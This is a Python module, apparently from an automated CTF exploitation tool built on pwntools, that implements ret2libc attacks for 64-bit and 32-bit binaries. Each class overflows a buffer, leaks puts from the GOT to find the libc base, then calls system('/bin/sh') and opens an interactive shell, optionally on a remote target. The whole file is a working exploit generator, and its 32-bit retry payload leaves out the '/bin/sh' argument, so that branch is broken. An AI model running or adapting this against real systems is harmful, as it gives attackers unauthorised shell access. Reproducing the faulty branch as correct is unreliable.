from common import *

class ret2libc64():

	def __init__(self,args):
		self.ret = False
		self.remote = args.remote
		self.inputs = args.inputs
		self.chall = args.chall
		self.offset = args.offset
		self.compatibility(args)
		self.gadgets = find_gadgets("pop rdi ; ret",self.chall),find_gadgets(": ret",self.chall)
		
	def compatibility(self,args):
		if self.offset < 0:
			err("Offset calculation failed!")
		if args.libc == None:
			err("Libc not provided!")
		if "puts" not in self.chall.plt.keys():
			err("Puts not found in binary!")
		self.libc = ELF(args.libc)
		if "puts" not in self.libc.symbols.keys() or "system" not in self.libc.symbols.keys():
			err("Symbols not found in libc.")


	def solve(self):
		pop_rdi,ret = self.gadgets	

		payload = flat([
			b"A"*self.offset,
			pop_rdi, self.chall.got["puts"],
			self.chall.plt["puts"],
			self.chall.symbols["main"]
			])

		io = start(self.remote,self.chall,self.libc.path)
		send_payload(payload,self.inputs,io)

		try:
			leak = unpack(io.recvline().decode("latin-1").rstrip("\n").encode("latin-1"),48)-self.libc.symbols["puts"]
		except:
			err("libc leak failed!")

		log.info("libc base -> "+hex(leak))

		payload = flat([
			b"A"*self.offset,
			pop_rdi, leak+next(self.libc.search(b"/bin/sh\x00")),
			leak+self.libc.symbols["system"]
		])

		if self.ret:
			payload = flat([
			b"A"*self.offset,
			pop_rdi, leak+next(self.libc.search(b"/bin/sh\x00")),
			ret,
			leak+self.libc.symbols["system"]
			])

		send_payload(payload,self.inputs,io)
		io.sendline(b"ls")
		try:
			io.recvline(timeout=5)
			log.info("Got shell!")
			io.interactive()
		except:
			if self.ret:
				err("ret2libc failed, even with ret gadget!")
			else:	
				log.info("ret2libc failed, trying with ret gadget now")
				io.close()
				self.ret = True
				self.solve()


class ret2libc32():

	def __init__(self,args):
		self.ret = False
		self.remote = args.remote
		self.remote = args.remote
		self.inputs = args.inputs
		self.chall = args.chall
		self.offset = args.offset
		self.gadget = find_gadgets(": ret",self.chall)
		self.compatibility(args)

	def compatibility(self,args):
		if self.offset < 0:
			err("Offset calculation failed!")
		if args.libc == None:
			err("Libc not provided!")
		if "puts" not in self.chall.plt.keys():
			err("Puts not found in binary!")
		self.libc = ELF(args.libc)
		if "puts" not in self.libc.symbols.keys() or "system" not in self.libc.symbols.keys():
			err("Symbols not found in libc.")

	def solve(self):
		payload = flat([
			b"A"*self.offset,
			self.chall.plt["puts"],
			self.chall.symbols["main"],
			self.chall.got["puts"],
			b"BBBB"
			])

		io = start(self.remote,self.chall,self.libc.path)
		send_payload(payload,self.inputs,io)
		try:
			leak = unpack(io.recv(4),32)-self.libc.symbols["puts"]
		except:
			err("libc leak failed!")
		
		log.info("libc base -> "+hex(leak))

		payload = flat([
			b"A"*self.offset,
			leak+self.libc.symbols["system"],
			0xdeadbeef,
			leak+next(self.libc.search(b"/bin/sh\x00"))])

		if self.ret:
			payload = flat([
				b"A"*self.offset,
				self.gadget,
				leak+self.libc.symbols["system"],
				0xdeadbeef])

		send_payload(payload,self.inputs,io)
		io.sendline(b"ls")
		try:
			io.recvline(timeout=5)
			io.interactive()
		except:
			if self.ret:
				err("ret2libc failed even with ret gadget!")
			else:
				log.info("ret2libc failed, trying with ret gadget now")
				io.close()
				self.ret = True
				self.solve()
